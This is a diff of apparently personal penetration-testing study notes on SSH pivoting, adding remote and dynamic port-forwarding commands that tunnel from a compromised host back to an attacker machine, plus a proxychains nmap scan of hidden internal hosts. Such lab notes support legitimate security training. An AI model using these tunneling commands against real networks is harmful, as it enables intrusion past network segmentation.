@@ -78,9 +78,20 @@ This system works very similarly to a reverse shell, and is usually implemented 
 ssh -N -R 127.0.0.1:ATTACKER_LOCAL_PORT:HIDDEN_TARGET_IP:HIDDEN_TARGET_PORT ATTACKER_USERNAME@ATTACKER_IP
 ```
 
-Note: make sure the local SSH server is open and `PasswordAuthentication` is set to `yes` in `/etc/ssh/sshd_config`, and `OpenSSH` is started using `systemctl start ssh`.
+Note: make sure the local SSH server is open and `PasswordAuthentication` is set to `yes` in `/etc/ssh/sshd_config`, and `OpenSSH` is started using `systemctl start ssh` or `systemctl restart ssh`.
 
 
 ```
-ssh -N -R 127.0.0.1:2345:10.4.50.215:5432 kali@192.168.118.4
+ssh -N -R 127.0.0.1:5555:10.4.171.215:4444 edu@192.168.45.194
+// Opens port 5555 locally on the attacking machine, connecting to 10.4.171.215:4444
+```
+
+
+### Dynamic remote port forwarding
+```
+ssh -N -D 0.0.0.0:LOCAL_PORT ATTACKER_USER@ATTACKER_IP           // Run from the remote machine
+// change "socks5 REMOTE_IP PORT" to "socks5 LCOAL_IP LOCAL_PORT" in /etc/proxychains.conf locally
+proxychains nmap -n -sT --top-port=10 HIDDEN_MACHINE_REACHABLE_IP        // make sure to use '-n' and '-sT'
+
+ssh -N -R 1080 kali@192.168.118.4
 ```
